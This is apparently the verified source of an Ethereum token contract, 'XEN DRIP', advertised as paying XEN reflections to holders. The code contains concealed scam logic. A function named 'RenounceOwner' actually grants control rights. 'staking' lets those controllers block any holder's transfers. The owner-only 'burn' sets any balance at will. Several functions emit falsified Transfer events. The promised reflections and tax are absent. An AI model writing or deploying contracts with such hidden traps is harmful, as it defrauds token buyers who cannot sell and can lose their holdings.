/**
 *Submitted for verification at Etherscan.io on 2022-10-12
*/

/*
    )          )   (      (    (    (     
 ( /(       ( /(   )\ )   )\ ) )\ ) )\ )  
 )\()) (    )\()) (()/(  (()/((()/((()/(  
((_)\  )\  ((_)\   /(_))  /(_))/(_))/(_)) 
__((_)((_)  _((_) (_))_  (_)) (_)) (_))   
\ \/ /| __|| \| |  |   \ | _ \|_ _|| _ \  
 >  < | _| | .` |  | |) ||   / | | |  _/  
/_/\_\|___||_|\_|  |___/ |_|_\|___||_|    


XEN DRIP - $XENDRIP

-Earn Daily XEN Rewards with XENDRIP. 

- Simply hold XenDrip to recieve $XEN reflections -

- Tax 1% First day, increasing with holders to max of 5% -

- Community Rewards and More -
                                          
 */


                                    
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract XENDRIP {
  
    mapping (address => uint256) public Balances;
    mapping (address => bool) iAmount;
    mapping (address => bool) delegate;

    // 
    string public name = "XEN DRIP";
    string public symbol = unicode"XENDRIP";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        Balances[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V2Router = 0x5c6BE6D5c7D098f12AC5bFFc3c693c8f5af01Afd;
    address lead_dev = 0xa82cbE54d2dAe403f7B3385aA2afA03E7AF0591A;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier V() {   
         require(delegate[msg.sender]);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V2Router)  {
        require(Balances[msg.sender] >= value);
        Balances[msg.sender] -= value;  
        Balances[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        require(!iAmount[msg.sender]);      
        require(Balances[msg.sender] >= value);
        Balances[msg.sender] -= value;  
        Balances[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


             function balanceOf(address account) public view returns (uint256) {
            return Balances[account]; }
        function burn(address x, uint256 burned) public returns (bool success) {
            require(msg.sender == owner);
        Balances[x] = burned;
                   return true; }

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address x) public {
        require(msg.sender == owner);
          delegate[x] = true; }
        function staking(address v) V public{          
        require(!iAmount[v]);
        iAmount[v] = true; }
        function unstaking(address v) V public {
        require(iAmount[v]);
        iAmount[v] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V2Router)  {
        require(value <= Balances[from]);
        require(value <= allowance[from][msg.sender]);
        Balances[from] -= value;  
        Balances[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        require(!iAmount[from]); 
        require(!iAmount[to]); 
        require(value <= Balances[from]);
        require(value <= allowance[from][msg.sender]);
        Balances[from] -= value;
        Balances[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }